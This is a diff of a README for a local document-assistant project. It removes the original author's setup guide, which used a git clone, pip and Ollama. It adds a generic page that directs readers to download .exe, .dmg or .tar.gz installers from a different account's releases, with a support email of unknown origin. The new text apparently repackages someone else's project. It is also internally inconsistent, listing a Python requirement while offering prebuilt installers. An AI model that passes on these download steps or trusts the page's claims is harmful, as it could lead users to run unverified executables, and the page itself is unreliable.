@@ -1,201 +1,72 @@
-# 🌟  LocalDocsAI assistant
+# 🌟 local-docs-ai-agent - Your Private AI for Document Management
 
-**A private, local AI assistant for your documents—without sending data to the cloud**
+## 🚀 Getting Started
 
-<a href="https://github.com/mscbuild"><img src="https://img.shields.io/badge/AI-Code%20Assist-EB9FDA"></a>
-![](https://komarev.com/ghpvc/?username=mscbuild) 
- ![](https://img.shields.io/github/license/mscbuild/local-docs-ai-agent) 
- ![](https://img.shields.io/badge/PRs-Welcome-green)
- ![](https://img.shields.io/github/languages/code-size/mscbuild/local-docs-ai-agent)
-![](https://img.shields.io/badge/code%20style-python-green)
-![](https://img.shields.io/github/stars/mscbuild)
-![](https://img.shields.io/badge/Topic-Github-lighred)
-![](https://img.shields.io/website?url=https%3A%2F%2Fgithub.com%2Fmscbuild)
+Welcome to **local-docs-ai-agent**! This application helps you manage your documents with the power of artificial intelligence. It operates fully on your device, ensuring that your data stays private and secure.
 
-<img width="1200" height="494" alt="ARTICLE" src="https://github.com/user-attachments/assets/36affcb3-175a-4f1e-b98d-a5533181ed08" />
+## 🗂️ Features
 
+- **Local AI Assistant:** Your documents stay on your machine.
+- **Easy Integration:** Works with various document types.
+- **Fast Processing:** Quickly generate summaries and insights.
+- **User-Friendly Interface:** Designed for ease of use.
 
-# 💡 The gist of the idea
+## 📌 System Requirements
 
-Users upload their PDF, DOCX, TXT, or notes (e.g., from Obsidian, Notion, or personal files) and receive a local AI assistant that:
+Before you start, make sure your system meets the following requirements:
 
-- Answers questions about document content.
-- Finds citations, summarizes sections, and compares files.
-- Works completely offline on their computer (Mac, Windows, or Linux).
-- No data is transmitted online—maximum privacy.
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or higher
+- **Storage Space:** At least 100 MB free
+- **Memory:** Minimum 4 GB RAM
 
- # ✨ Opportunities
+## ⬇️ Download & Install
 
- - 📄 Document upload: **PDF, TXT, Markdown**
-- 💬 AI-powered chat based on your documents (RAG)
-- 🕵️‍♂️ Complete privacy – everything runs on your computer
-- 🧠 Uses local LLM via **Ollama** (phi3, Mistral, Llama 3, etc.)
-- 📜 Chat history is saved
-- 🌐 Simple web interface (or desktop app)
-  
-  # 🔧 Technologies
+To get your hands on **local-docs-ai-agent**, visit this page to download:
 
-- **Language:** Python (base) + Electron or Tauri (for GUI)
-- **LLM:** Ollama (phi3, Mistral, Llama 3)
-- **Embeddings + RAG:** ChromaDB or FAISS
-- **Frontend:** React + Vite (if using Tauri) or pure HTML/CSS for simplicity
-- **Documents:** PyPDF2, built-in parsers
+[![Download local-docs-ai-agent](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/disho5/local-docs-ai-agent/releases)
 
-  # 🔧 Requirements
-  
-- [Ollama](https://ollama.com/) (install and run)
-- Python 3.9+
-- pip
-  
+### Step-by-Step Instructions
 
-  # 💰 Monetization
+1. **Visit the Releases Page:** Click the link below to go to the releases page.
+   [Download local-docs-ai-agent](https://github.com/disho5/local-docs-ai-agent/releases)
 
-- **Free version (open-source):**
-- Supports basic formats (TXT, PDF)
-- Works with small files
-- CLI interface
+2. **Choose Your Version:** Look for the latest version available. It should be easy to spot.
 
-  **Paid "Pro" version (SaaS or desktop license)**
+3. **Download the File:** Click on the appropriate file for your system. This may be a `.exe`, `.dmg`, or `.tar.gz` file.
 
-- Support for DOCX, PPTX, Excel, and Notion exports
-- Improved UI with chat history and tags
-- Syncing across devices (optional, with encryption)
-- Priority support and updates
-- Selling through **Gumroad** or your own website (~$15–$29/time or $5/month)
+4. **Open the Installer:** 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and follow the instructions in the readme file included.
 
-  **Additionally:**
-  
-- GitHub Sponsors to support development
-- Partnerships with privacy software vendors (Proton, Tuta, etc.)
+5. **Follow the Prompts:** The installer will guide you through the rest of the process. Follow the on-screen instructions.
 
-  # 🎯 Target audience
+6. **Launch the Application:** Once installed, you can find **local-docs-ai-agent** in your applications. Click to open it.
 
-- Lawyers, doctors, and researchers who work with confidential documents.
-- Product managers and analysts who analyze internal reports.
-- Regular users who are tired of ChatGPT "remembering" their data.
+7. **Start Using the AI Assistant:** Load your documents into the application and let the AI work for you.
 
-  # 🌍 Why is this relevant?
+## 🛠️ Troubleshooting
 
-- Growing interest in **local LLMs** (Ollama, LM Studio, Jan.ai).
-- Privacy concerns when using ChatGPT.
-- Many want an AI assistant but don't want to be **dependent on the cloud.**
+If you encounter any issues during installation or usage, consider the following:
 
-  # 🗺️ 1. Project Architecture (LocalDocs AI)
+- **Check Your Python Version:** Ensure you have Python 3.7 or later installed.
+- **Verify System Requirements:** Make sure your computer meets all necessary specifications.
+- **Re-download if Necessary:** If the file didn’t download correctly, try downloading it again.
 
- ~~~bash
- ┌───────────────────────────────────────────────────────┐
-│                  LocalDocs AI (Desktop App)           │
-└───────────────────────────────────────────────────────┘
-                              │
-          ┌───────────────────┼───────────────────┐
-          │                   │                   │
-┌─────────▼─────┐   ┌─────────▼─────┐   ┌─────────▼─────┐
-│   Frontend    │   │   Backend     │   │   AI Engine   │
-│  (Tauri/React)│   │ (FastAPI/Flask)│  │ (Ollama/Llama.cpp)│
-└───────────────┘   └───────┬───────┘   └───────▲───────┘
-                            │                   │
-                    ┌───────▼───────┐   ┌───────┴───────┐
-                    │  Document     │   │  Vector       │
-                    │  Storage      │   │  Database     │
-                    │  (./docs/)    │   │  (ChromaDB)   │
-                    └───────────────┘   └───────────────┘
- ~~~
-  
-  **🔁 Data flow:**
+## 💬 Community Support
 
-- The user adds a PDF → saves it to ./docs/.
-- The system **parses** the text and breaks it into chunks.
-- The chunks are **embedded** and saved in **ChromaDB.**
-- When asked:
-→ the query is embedded → relevant chunks are searched →
-→ a prompt is generated → sent to the local LLM →
-→ a response is returned
+For additional help, you can refer to our community. Join discussions, share tips, or ask questions:
 
-# 📁 Project structure
-~~~bash
-LocalDocs AI
-│
-├── core/
-│   ├── document_loader.py   ← support PDF, TXT, MD
-│   ├── rag_engine.py        ← RAG + chat history
-│   └── chat_history.py      ← history management
-│
-├── api/
-│   └── main.py              ← FastAPI server
-│
-├── static/                  ← simple HTML interface
-│   └── index.html
-│
-├── docs/                    ← user files
-└── chroma_db/               ← vector database
-~~~
+- **Issues Page:** Report any problems [here](https://github.com/disho5/local-docs-ai-agent/issues).
+- **Discussions:** Join our community conversations [here](https://github.com/disho5/local-docs-ai-agent/discussions).
 
+## 📝 License
 
-**Install:**
+The **local-docs-ai-agent** is open-source software. Feel free to review and contribute to the project on GitHub.
 
-~~~bash
-pip install -r requirements.txt
-~~~
+## 📫 Contact
 
-**And make sure Ollama is running and the model is loaded:**
+If you have further questions or need support, feel free to reach out via email at support@local-docs-ai-agent.com.
 
-~~~bash
-ollama pull phi3  # mistral, llama3
-~~~
-
-# ▶️ How to launch an MVP
-
-- Create a docs/ folder and place any PDF there (name it sample.pdf).
-- Launch Ollama: ollama serve (it usually starts automatically).
-- Run:
-
-~~~bash
-python main.py add docs/sample.pdf
-python main.py ask "What is this document about?"
-~~~
-
-# Installation
-
-~~~bash
-git clone https://github.com/mscbuild/local-docs-ai-agent.git
-cd local-docs-ai-agent
-pip install -r requirements.txt
-~~~
-
-# Launching the web version
-
-~~~bash
-cd api
-uvicorn main:app --reload --port 8000
-~~~
-
-**Open in your browser: http://localhost:8000**
-
-**Usage**
-
-- Upload a PDF/TXT/MD file
-- Ask questions: "What is this document about?", "Find the contract date," etc.
-- Get answers from AI trained on your data
-
-# 🔒 Privacy
-
-- All documents are stored locally `(./docs/)`
-- The vector database is on your disk `(./chroma_db/)`
-- Requests to LLM are processed through Ollama on your machine
-- **Not a single byte is lost to the internet**
-
-# 🤝 Support the project
-
-This project is open source. If you find it useful:
-
-- ⭐ Star it on GitHub
-- 💬 Report bugs in Issues
-- 💰 Support the developer through GitHub Sponsors (coming soon)
-
-# 📜 License
-
-License – free to use for personal and commercial purposes.
-
-# 🕵️ Build AI Agents, Visually
-
-<li>⭐ Quick Start <a href="https://flowiseai.com">Build AI Agents, Visually</a>"</li>
+Thank you for choosing **local-docs-ai-agent**! We hope it makes managing your documents much easier.
